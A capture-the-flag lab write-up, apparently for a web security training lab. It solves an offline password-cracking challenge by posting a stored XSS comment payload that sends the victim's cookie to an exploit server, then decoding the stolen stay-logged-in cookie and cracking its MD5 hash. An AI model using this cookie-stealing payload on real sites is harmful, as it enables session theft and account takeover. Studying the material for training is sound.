# Lab: Offline password cracking

 This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
- Your credentials: wiener:peter
- Victim's username: carlos

## Solution

Based on the description above we access to any post and XSS attack at the comment.

with this payload: `<script>document.location='https://exploit-0a7c008f04215b04c0fa17a8012f006e.exploit-server.net/exploit?c='+document.cookie</script>`

![](https://i.imgur.com/xUOkqMp.png)

After post comment we access to `access log` page in `exploit server`.

![](https://i.imgur.com/teJn407.png)

We received a `stay-logged-in` cookie: `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`
Decode it with base64 decode: `carlos:26323c16d5f4dabff3bb136f2460a943`

Same format as previous lab, we demonstrate that carlos's cookie.

Get the encrypted part of the cookie to decrypt with [MD5 Decrypt Online](https://md5decrypt.net/en/)

![](https://i.imgur.com/1Wfoar6.png)

We got the carlos's password: `onceuponatime`

![](https://i.imgur.com/i3y6pxE.png)

Login with carlos's credentials and delete that account to solve the lab.